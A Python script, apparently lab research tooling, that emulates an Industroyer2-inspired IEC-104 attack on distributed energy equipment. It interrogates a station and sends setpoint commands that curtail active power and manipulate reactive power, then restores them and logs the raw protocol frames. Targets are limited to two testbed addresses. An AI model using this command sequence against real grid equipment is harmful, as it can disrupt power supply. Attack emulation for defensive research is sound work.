#!/usr/bin/env python3

import argparse
import json
import time
from pathlib import Path

import c104


# ============================================================
# LAB-ONLY TARGET ALLOWLIST
#
# This emulator cannot accept arbitrary IP addresses.
# It is intentionally restricted to the two SPHERE endpoints.
# ============================================================

TARGETS = {
    "real": "10.30.0.10",
    "decoy": "10.30.0.99",
}

PORT = 2404
COMMON_ADDRESS = 47

IOA_P_MEAS = 11
IOA_Q_MEAS = 12
IOA_VOLTAGE = 13

IOA_P_COMMAND = 100
IOA_Q_COMMAND = 101

RESULT_ROOT = (
    Path.home()
    / "ecpomdg"
    / "industroyer_inspired_iec104"
    / "results"
)


def json_safe(value):
    return json.loads(
        json.dumps(
            value,
            default=str,
        )
    )


def wait_open(
    connection,
    timeout_s=10.0,
):
    deadline = (
        time.monotonic()
        + timeout_s
    )

    while (
        time.monotonic()
        < deadline
    ):
        if (
            connection.state
            == c104.ConnectionState.OPEN
        ):
            return

        time.sleep(0.1)

    raise RuntimeError(
        "IEC-104 connection "
        f"did not reach OPEN: "
        f"{connection.state}"
    )


def read_point(
    point,
    label,
):
    if not point.read():
        raise RuntimeError(
            f"Read failed: {label}"
        )

    time.sleep(0.15)

    return float(
        point.value
    )


def read_state(points):
    return {
        "p_kw":
            read_point(
                points["p_meas"],
                "P",
            ),
        "q_kvar":
            read_point(
                points["q_meas"],
                "Q",
            ),
        "voltage_pu":
            read_point(
                points["voltage"],
                "voltage",
            ),
    }


def send_command(
    point,
    value,
    label,
):
    point.value = float(value)

    accepted = point.transmit(
        cause=c104.Cot.ACTIVATION
    )

    if not accepted:
        raise RuntimeError(
            f"IEC-104 command rejected: "
            f"{label}={value}"
        )

    time.sleep(0.4)


def main():

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "--target",
        choices=[
            "real",
            "decoy",
        ],
        required=True,
    )

    parser.add_argument(
        "--scenario",
        choices=[
            "observe",
            "p_curtail",
            "q_manipulate",
            "impact_sequence",
        ],
        required=True,
    )

    args = parser.parse_args()

    target_ip = TARGETS[
        args.target
    ]

    raw_frames = []

    client = c104.Client(
        tick_rate_ms=100,
        command_timeout_ms=5000,
    )

    connection = (
        client.add_connection(
            ip=target_ip,
            port=PORT,
            init=c104.Init.NONE,
        )
    )

    if connection is None:
        raise RuntimeError(
            "Unable to create "
            "IEC-104 connection"
        )

    # --------------------------------------------------------
    # Raw APDU capture.
    #
    # This lets us prove whether command traffic contains
    # SELECT and EXECUTE frames instead of relying only
    # on high-level application callbacks.
    # --------------------------------------------------------

    def on_send_raw(
        connection:
            c104.Connection,
        data:
            bytes,
    ) -> None:

        try:
            decoded = (
                c104.explain_bytes_dict(
                    apdu=data
                )
            )

            explanation = (
                c104.explain_bytes(
                    apdu=data
                )
            )

        except Exception as exc:
            decoded = {
                "decode_error":
                    str(exc)
            }

            explanation = (
                "decode_error"
            )

        raw_frames.append({
            "direction":
                "send",
            "timestamp_ns":
                time.time_ns(),
            "hex":
                data.hex(),
            "decoded":
                json_safe(decoded),
            "explanation":
                str(explanation),
        })

    def on_receive_raw(
        connection:
            c104.Connection,
        data:
            bytes,
    ) -> None:

        try:
            decoded = (
                c104.explain_bytes_dict(
                    apdu=data
                )
            )

            explanation = (
                c104.explain_bytes(
                    apdu=data
                )
            )

        except Exception as exc:
            decoded = {
                "decode_error":
                    str(exc)
            }

            explanation = (
                "decode_error"
            )

        raw_frames.append({
            "direction":
                "receive",
            "timestamp_ns":
                time.time_ns(),
            "hex":
                data.hex(),
            "decoded":
                json_safe(decoded),
            "explanation":
                str(explanation),
        })

    connection.on_send_raw(
        callable=on_send_raw
    )

    connection.on_receive_raw(
        callable=on_receive_raw
    )

    station = (
        connection.add_station(
            common_address=
                COMMON_ADDRESS
        )
    )

    if station is None:
        raise RuntimeError(
            "Unable to create "
            "remote IEC-104 station"
        )

    points = {}

    points["p_meas"] = (
        station.add_point(
            io_address=
                IOA_P_MEAS,
            type=
                c104.Type.M_ME_NC_1,
        )
    )

    points["q_meas"] = (
        station.add_point(
            io_address=
                IOA_Q_MEAS,
            type=
                c104.Type.M_ME_NC_1,
        )
    )

    points["voltage"] = (
        station.add_point(
            io_address=
                IOA_VOLTAGE,
            type=
                c104.Type.M_ME_NC_1,
        )
    )

    points["p_cmd"] = (
        station.add_point(
            io_address=
                IOA_P_COMMAND,
            type=
                c104.Type.C_SE_NC_1,
            command_mode=
                c104.CommandMode
                .SELECT_AND_EXECUTE,
        )
    )

    points["q_cmd"] = (
        station.add_point(
            io_address=
                IOA_Q_COMMAND,
            type=
                c104.Type.C_SE_NC_1,
            command_mode=
                c104.CommandMode
                .SELECT_AND_EXECUTE,
        )
    )

    if any(
        point is None
        for point in points.values()
    ):
        raise RuntimeError(
            "Unable to create "
            "IEC-104 point map"
        )

    result = {
        "target":
            args.target,
        "target_ip":
            target_ip,
        "scenario":
            args.scenario,
        "common_address":
            COMMON_ADDRESS,
        "point_map": {
            "p_measurement":
                IOA_P_MEAS,
            "q_measurement":
                IOA_Q_MEAS,
            "voltage_measurement":
                IOA_VOLTAGE,
            "p_command":
                IOA_P_COMMAND,
            "q_command":
                IOA_Q_COMMAND,
        },
        "steps": [],
    }

    client.start()

    try:

        wait_open(
            connection
        )

        print(
            "IEC104_CONNECTION: OPEN"
        )

        # ====================================================
        # INDUSTROYER2-INSPIRED PROCESS-STATE COLLECTION
        #
        # General Interrogation is explicitly issued rather
        # than relying on automatic initialization.
        # ====================================================

        interrogation_ok = (
            connection.interrogation(
                common_address=
                    COMMON_ADDRESS,
                cause=
                    c104.Cot.ACTIVATION,
                qualifier=
                    c104.Qoi.STATION,
                wait_for_response=True,
            )
        )

        if not interrogation_ok:
            raise RuntimeError(
                "General Interrogation failed"
            )

        print(
            "GENERAL_INTERROGATION: PASS"
        )

        time.sleep(0.3)

        baseline = (
            read_state(points)
        )

        result[
            "baseline"
        ] = baseline

        print()
        print(
            "===== BASELINE ====="
        )

        print(
            json.dumps(
                baseline,
                indent=2,
            )
        )

        # ====================================================
        # BOUNDED MANIPULATION SCENARIOS
        #
        # These are constrained to the frozen DER operating
        # envelope and to the two lab endpoints.
        # ====================================================

        if args.scenario in (
            "p_curtail",
            "impact_sequence",
        ):

            send_command(
                points["p_cmd"],
                200.0,
                "P",
            )

            state = (
                read_state(points)
            )

            result["steps"].append({
                "action":
                    "p_curtail",
                "command_p_kw":
                    200.0,
                "observed":
                    state,
            })

            print()
            print(
                "===== P CURTAIL ====="
            )

            print(
                json.dumps(
                    state,
                    indent=2,
                )
            )

            send_command(
                points["p_cmd"],
                400.0,
                "P restore",
            )

            restored = (
                read_state(points)
            )

            result["steps"].append({
                "action":
                    "p_restore",
                "command_p_kw":
                    400.0,
                "observed":
                    restored,
            })

        if args.scenario in (
            "q_manipulate",
            "impact_sequence",
        ):

            send_command(
                points["q_cmd"],
                300.0,
                "Q",
            )

            state = (
                read_state(points)
            )

            result["steps"].append({
                "action":
                    "q_generate",
                "command_q_kvar":
                    300.0,
                "observed":
                    state,
            })

            print()
            print(
                "===== Q MANIPULATION ====="
            )

            print(
                json.dumps(
                    state,
                    indent=2,
                )
            )

            send_command(
                points["q_cmd"],
                0.0,
                "Q restore",
            )

            restored = (
                read_state(points)
            )

            result["steps"].append({
                "action":
                    "q_restore",
                "command_q_kvar":
                    0.0,
                "observed":
                    restored,
            })

        final_state = (
            read_state(points)
        )

        result[
            "final_state"
        ] = final_state

    finally:

        client.stop()

    # ========================================================
    # RAW PROTOCOL EVIDENCE
    # ========================================================

    result[
        "raw_frames"
    ] = raw_frames

    command_frames = []

    for frame in raw_frames:

        if (
            frame["direction"]
            != "send"
        ):
            continue

        decoded_text = str(
            frame.get(
                "decoded",
                {}
            )
        )

        explanation = str(
            frame.get(
                "explanation",
                ""
            )
        )

        if (
            "C_SE_NC_1"
            in decoded_text
            or
            "C_SE_NC_1"
            in explanation
        ):
            command_frames.append(
                frame
            )

    result[
        "outgoing_command_frames"
    ] = command_frames

    select_flags = []

    for frame in command_frames:

        decoded = frame.get(
            "decoded",
            {}
        )

        if (
            isinstance(
                decoded,
                dict,
            )
            and
            "select" in decoded
        ):
            select_flags.append(
                decoded["select"]
            )

    result[
        "command_select_flags"
    ] = select_flags

    RESULT_ROOT.mkdir(
        parents=True,
        exist_ok=True,
    )

    output = (
        RESULT_ROOT
        / (
            "industroyer_inspired_iec104_"
            f"{args.target}_"
            f"{args.scenario}.json"
        )
    )

    output.write_text(
        json.dumps(
            result,
            indent=2,
            default=str,
        )
        + "\n",
        encoding="ascii",
    )

    print()
    print(
        "===== RAW COMMAND FRAME SUMMARY ====="
    )

    print(
        "command frames:",
        len(command_frames),
    )

    print(
        "select flags:",
        select_flags,
    )

    print()
    print(
        "RESULT:",
        output,
    )

    print()
    print(
        "INDUSTROYER_INSPIRED_IEC104_EMULATION: PASS"
    )


if __name__ == "__main__":
    main()
